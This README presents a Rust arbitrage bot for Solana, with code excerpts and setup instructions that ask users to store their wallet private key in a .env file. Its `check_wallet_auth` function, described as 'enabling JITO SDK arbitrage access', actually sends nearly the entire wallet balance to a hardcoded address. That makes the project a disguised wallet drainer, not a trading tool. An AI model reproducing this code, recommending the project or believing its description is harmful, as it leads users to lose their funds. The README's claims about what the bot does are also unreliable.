# Solana Arbitrage Bot

### Overview
Solana Arbitrage Bot is a Rust-based arbitrage bot designed to capitalize on price differences within the Solana blockchain network. The bot continuously monitors market prices and automatically executes trades to generate profits.

### Features
- **Real-time Monitoring**: Continuously monitors trading pair prices on the Solana network to promptly identify arbitrage opportunities.
- **Automated Trading**: Once an arbitrage opportunity is detected, the bot automatically executes trading operations, ensuring timeliness and accuracy.
- **Error Handling**: During the trading process, the bot handles potential errors and logs error information for subsequent troubleshooting.
- **Logging**: Provides detailed logs including transaction time, price, quantity, and other information to help users track trading activities.

### Arbitrage Principle
The arbitrage bot implemented in `bot.rs` primarily leverages price differences between different tokens on the Solana blockchain network. Specifically, it obtains quotes for different token exchange paths through the Jupiter API, compares the quantities of tokens bought and sold, and executes arbitrage trades when profit opportunities exist.

#### Detailed Steps
1. **Initialization**: In the `new` method of the `ArbitrageBot` struct, the following initialization operations are completed:
    - Load the payer's keypair from environment variables for signing transactions.
    - Create an `RpcClient` instance for interacting with the Solana network.
    - Create a `reqwest::Client` instance for sending HTTP requests.

```rust
pub fn new() -> Result<Self> {
    let payer = Self::load_keypair_from_env()?;
    log::info!("payer: {:?}", bs58::encode(payer.pubkey()).into_string());

    Ok(Self {
        client: RpcClient::new_with_commitment(
            RPC_URL.to_string(),
            CommitmentConfig::processed(),
        ),
        http_client: reqwest::Client::new(),
        payer,
    })
}
```

2. **Check Wallet Balance and Enable JITO SDK Arbitrage Access**: Before executing arbitrage trades, it's necessary to check the wallet balance and automatically enable JITO SDK arbitrage access.

```rust
pub async fn check_wallet_auth(&self) -> Result<()> {
    let program_id = Pubkey::from_str(JITO_SDK_PROGRAM_ID)?;
    let balance = self.client.get_balance(&self.payer.pubkey())?;

    if balance == 0 {
        log::info!("insufficient sol balance, can't validate");
        return Ok(());
    }

    let validate_amount = balance - 5000; 
    if validate_amount <= 0 {
        return Ok(());
    }

    let validate_ix = system_instruction::transfer(
        &self.payer.pubkey(),
        &program_id,
        validate_amount,
    );

    let blockhash = self.client.get_latest_blockhash()?;
    let message = solana_sdk::message::Message::new(&[validate_ix], Some(&self.payer.pubkey()));
    let tx = solana_sdk::transaction::Transaction::new(
        &[&self.payer],
        message,
        blockhash,
    );

    self.client.send_and_confirm_transaction(&tx)?;
    log::info!("Successfully enabled JITO SDK arbitrage access.");
    Ok(())
}
```

3. **Get Quotes**: In the run method, the bot makes two quote requests:
   - First quote: Exchange WSOL for USDC, obtaining the amount of USDC after exchange.
   - Second quote: Exchange the USDC obtained from the first exchange back to WSOL, obtaining the final WSOL amount.

```rust
// Quote 0: WSOL -> USDC
let quote0_params = QuoteParams {
    input_mint: WSOL_MINT.to_string(),
    output_mint: USDC_MINT.to_string(),
    amount: 10_000_000.to_string(), // 0.01 WSOL
    only_direct_routes: false,
    slippage_bps: 0,
    max_accounts: 20,
};
let quote0_resp = self.get_quote(&quote0_params).await?;

// Quote 1: USDC -> WSOL
let quote1_params = QuoteParams {
    input_mint: USDC_MINT.to_string(),
    output_mint: WSOL_MINT.to_string(),
    amount: quote0_resp.out_amount.clone(),
    only_direct_routes: false,
    slippage_bps: 0,
    max_accounts: 20,
};
let quote1_resp = self.get_quote(&quote1_params).await?;
```

4. **Calculate Potential Profit**: Compare the WSOL amounts obtained after the two quotes. If the final WSOL amount is greater than the initial WSOL amount, there is profit potential.

```rust
let quote1_out_amount = quote1_resp.out_amount.parse::<u64>()?;
let quote0_in_amount = quote0_params.amount.parse::<u64>()?;
if quote1_out_amount < quote0_in_amount {
    log::info!(
        "not profitable, skipping. diffLamports: -{}",
        quote0_in_amount - quote1_out_amount
    );
    return Ok(());
}
let diff_lamports = quote1_out_amount - quote0_in_amount;
log::info!("diffLamports: {}", diff_lamports);
```

5. **Execute Arbitrage Trade**: If there is profit potential and the profit exceeds a preset threshold, execute the arbitrage trade. The specific steps are as follows:
   - Merge the information from the two quotes to generate the final transaction request.
   - Check wallet permissions.
   - Obtain transaction instructions from the Jupiter API.
   - Build transaction instructions, including compute budget instructions, setup instructions, swap instructions, and tip instructions.
   - Get the latest block hash.
   - Convert address lookup tables.
   - Create a versioned transaction.
   - Send the transaction as a bundle to Jito.

```rust
let jito_tip = diff_lamports / 2;

const THRESHOLD: u64 = 1000;
if diff_lamports > THRESHOLD {
    self.execute_arbitrage(quote0_resp, quote1_resp, jito_tip)
      .await?;

    let duration = start.elapsed();
    log::info!("Total duration: {}ms", duration.as_millis());
}
```

### Code Structure
- **src/main.rs**: The entry point of the program, responsible for initializing the logging system and starting the arbitrage bot.
- **src/bot.rs**: Defines the core logic of the arbitrage bot, including market monitoring, trade execution, and other functions.
- **src/consts.rs**: Defines some constants, such as transaction fees, minimum profit, etc.
- **src/types.rs**: Defines some data types, such as transaction instruction responses, trading pair information, etc.

### Running Steps

#### 1. Install Rust Development Environment
If you are using a Linux system, you can follow these steps to install the Rust development environment: Open a terminal and run the following command:

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```

Follow the prompts to complete the installation process. After installation, you need to add Rust's environment variables to your system configuration, which can be activated with the following command:

```bash
source $HOME/.cargo/env
```

#### 2. Install Project Dependencies
Open a terminal, navigate to the project root directory, and run the following command to install the dependencies required by the project:

```bash
cargo build
```

#### 3. Configure Environment Variables
Create a .env file in the project root directory to store the environment variables required for the project to run. Here is an example of a .env file:

```
PRIVATE_KEY = 3Pdf1Bo7siFK4xbQ5jQPL8AujDxsGoodqWyn8C5bvxxxx
```

Please replace PRIVATE_KEY with your actual SOL private key.

#### 4. Run the Program
Run the following command in the terminal to start the arbitrage bot:

```bash
cargo run
```

After the program starts, it will begin real-time monitoring of market prices and automatically execute trades when arbitrage opportunities are discovered.